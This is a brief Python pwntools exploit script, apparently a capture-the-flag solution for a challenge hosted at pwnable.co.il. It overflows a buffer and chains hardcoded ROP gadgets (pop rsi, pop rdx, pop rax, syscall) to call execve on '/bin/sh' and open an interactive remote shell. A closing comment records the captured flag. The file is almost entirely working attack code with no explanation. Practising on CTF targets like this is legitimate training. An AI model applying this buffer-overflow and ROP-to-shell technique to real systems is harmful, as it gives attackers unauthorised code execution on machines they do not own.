from pwn import *


### gadgets ###
mov_rdi_rsi = p64(0x00000000004768fe)
pop_rsi = p64(0x000000000040f25e)
pop_rdx = p64(0x00000000004017cf)
pop_rax = p64(0x0000000000451707)
syscall = p64(0x000000000041df74)

### definses ### 
BINSH = b"/bin/sh\x00"
PADDING = b"a" * 0x20

def main():
    ### run ###
    #p = process("./help")
    p = remote("pwnable.co.il", 9015)

    ### payload start ###
    payload = BINSH
    payload += PADDING
    payload += mov_rdi_rsi      
    payload += pop_rsi         
    payload += p64(0x0)
    payload += pop_rdx       
    payload += p64(0x0)
    payload += pop_rax       
    payload += p64(0x3b)
    payload += syscall    

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{e_shentsize_0?_How_is_that_possible??}